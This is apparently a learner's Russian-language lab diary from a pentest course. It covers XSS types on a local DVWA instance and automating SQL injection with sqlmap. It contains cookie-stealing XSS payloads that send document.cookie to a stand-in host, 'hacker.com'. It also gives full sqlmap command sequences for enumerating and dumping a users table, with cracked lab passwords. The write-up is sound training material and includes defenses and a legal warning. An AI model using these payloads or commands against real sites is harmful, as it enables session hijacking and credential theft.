# День 4 — XSS атаки + sqlmap автоматизация

**Дата:** 1 апреля 2026
**Платформа:** DVWA + sqlmap + Burp Suite
**Статус:** ✅ Завершён

---

## XSS (Cross-Site Scripting) — три вида атак

**XSS** — внедрение JavaScript кода в веб-страницу. Браузер жертвы думает что код пришёл от доверенного сайта и выполняет его. Главная цель — украсть session cookie и войти в аккаунт без пароля.

### Тип 1 — Reflected XSS (Отражённый)

- Payload вставляется в URL параметр
- Сервер "отражает" его обратно в HTML не проверяя
- Срабатывает **один раз** — жертва должна кликнуть на ссылку
- Использование: фишинговые ссылки с payload

**Payload использованный сегодня:**
```
<script>alert(document.cookie)</script>
```
**Результат:** всплывающее окно показало session cookie:
```
PHPSESSID=k3hvgjkqekv7gpic5v133o5uj1; security=low
```

### Тип 2 — Stored XSS (Хранимый) — самый опасный

- Payload сохраняется в базе данных
- Срабатывает у **каждого посетителя** страницы автоматически
- Одна инъекция = тысячи жертв
- Типичные места: комментарии, поля профиля, форумы

**Пример payload:**
```
<script>alert('Stored XSS!')</script>
```
Ввёл в поле Name → Sign Guestbook → обновил страницу → alert сработал снова (сохранён в БД)

### Тип 3 — DOM XSS

- Payload обрабатывается только в браузере — сервер не видит
- JavaScript на странице небезопасно вставляет данные из URL в HTML
- Сложнее обнаружить — WAF и серверные сканеры пропускают
- Опасные функции: `innerHTML`, `document.write`, `eval`

### Кража cookie — главная цель XSS

```javascript
// Украсть cookie и отправить атакующему (тихо):
<script>new Image().src='http://hacker.com/?c='+document.cookie</script>

// Обход фильтров без тега script:
<img src=x onerror="fetch('http://hacker.com/?c='+document.cookie)">
```

### Защита от XSS

1. **Экранирование ввода** — `<` превращается в `&lt;`
2. **Content Security Policy (CSP)** — запрещает inline скрипты
3. **HttpOnly на cookie** — JavaScript не может читать cookie даже при XSS

---

## sqlmap — автоматизация SQL инъекций

sqlmap автоматически находит и эксплуатирует SQL инъекции.
То что вручную занимает 30+ минут — sqlmap делает за секунды.

### Что sqlmap делает автоматически:
- Определяет тип базы данных (MySQL, PostgreSQL, MSSQL...)
- Находит все типы инъекций (boolean, error-based, time-based, union)
- Получает список всех баз данных
- Получает все таблицы и колонки
- Выгружает данные
- Взламывает MD5 хэши паролей

### Команды использованные сегодня:

**Шаг 1 — найти уязвимость и показать все БД:**
```bash
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
--cookie="PHPSESSID=j8ka8nrvnu1o7fn6c27fejn5a6;security=low" \
--dbs --batch
```

**Результат:**
```
available databases:
[*] dvwa
[*] information_schema
```

**Шаг 2 — таблицы в базе dvwa:**
```bash
sqlmap -u "URL" --cookie="КУК" -D dvwa --tables --batch
```

**Результат:**
```
Database: dvwa
[2 tables]: guestbook, users
```

**Шаг 3 — выгрузить таблицу users + взломать хэши:**
```bash
sqlmap -u "URL" --cookie="КУК" -D dvwa -T users --dump --batch
```

**Результат — все пароли взломаны за 33 секунды:**

| user_id | user | password (хэш) | пароль |
|---|---|---|---|
| 1 | admin | 5f4dcc3b... | password |
| 2 | gordonb | e99a18c4... | abc123 |
| 3 | 1337 | 8d3533d7... | charley |
| 4 | pablo | 0d107d09... | letmein |
| 5 | smithy | 5f4dcc3b... | password |

### Важные флаги sqlmap:

| Флаг | Что делает |
|---|---|
| `-u` | URL цели |
| `--cookie` | Cookie сессии (нужен для авторизованных страниц) |
| `--dbs` | Показать все базы данных |
| `-D имя` | Выбрать базу данных |
| `--tables` | Показать таблицы |
| `-T имя` | Выбрать таблицу |
| `--dump` | Выгрузить данные |
| `--batch` | Авто-ответ на все вопросы |
| `--level=5` | Максимальная агрессивность |
| `--risk=3` | Максимальный риск payload |

### Найденные типы инъекций на DVWA:
- ✅ Boolean-based blind
- ✅ Error-based
- ✅ Time-based blind
- ✅ UNION query

### Сравнение ручной SQLi vs sqlmap:

| | Вручную (день 3) | sqlmap (день 4) |
|---|---|---|
| Время | 30+ минут | 33 секунды |
| Типы инъекций | Union-based | Все 4 типа |
| Взлом хэшей | Отдельно через crackstation | Автоматически |
| Понимание | Глубокое | Только если изучил вручную |

**Важно:** сначала нужно понять ручную SQLi — иначе не понимаешь что делает sqlmap.

---

## Как получить cookie для sqlmap

1. Открыть Burp Suite → Proxy → HTTP history
2. Найти запрос к целевому сайту
3. Кликнуть на запрос → в панели Request найти строку `Cookie:`
4. Скопировать значение: `PHPSESSID=xxx; security=low`

---

## Предупреждение

sqlmap использовать только на:
- DVWA на своём компьютере
- HackTheBox, TryHackMe (специально уязвимые)
- Реальных целях с **письменным разрешением**

На реальных сайтах без разрешения = уголовная ответственность.

---

## Что сделал сегодня

- [x] Reflected XSS — украл session cookie через `alert(document.cookie)`
- [x] Stored XSS — payload сохранился в БД и сработал после обновления
- [x] sqlmap — автоматически нашёл SQLi за 14 секунд
- [x] sqlmap --dump — выгрузил все данные и взломал пароли за 33 секунды
- [x] Понял разницу между тремя типами XSS

---

## Завтра — День 5

- Сетевые атаки: nmap углублённо (-sV, -sC, -A, -O)
- Metasploit Framework — первое знакомство
- Поиск эксплойтов через searchsploit
- TryHackMe: первая машина
